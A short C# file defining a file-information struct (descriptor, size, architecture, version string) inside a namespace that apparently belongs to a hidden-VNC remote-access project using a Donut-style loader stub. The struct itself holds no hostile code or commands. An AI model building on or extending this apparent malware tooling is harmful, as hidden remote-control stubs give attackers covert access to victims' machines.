using System.Runtime.InteropServices;

namespace ShitarusPrivate.HVNC.StubUtils.Donut.Structs
{
    public struct DSFileInfo
    {
        public int fd;

        public ulong size;

        public byte map;

        public int type;

        public int arch;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
        public char[] ver;
    }
}
